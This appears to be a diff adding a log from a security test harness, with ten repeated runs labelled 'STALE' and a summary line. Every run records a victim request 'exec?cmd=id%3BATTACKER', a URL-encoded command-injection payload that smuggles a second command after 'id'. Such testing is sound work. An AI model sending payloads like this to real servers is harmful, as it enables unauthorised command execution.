@@ -1,0 +1,11 @@
+run0 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run1 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run2 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run3 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run4 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run5 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run6 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run7 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run8 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+run9 control=HTTP/1.1 200 OK victim_line=[b'exec?cmd=id%3BATTACKER&rp=1'] uid=True STALE
+3aeb255d3d7f__f2b3415b: cold-server one-shot pairs stale 10/10
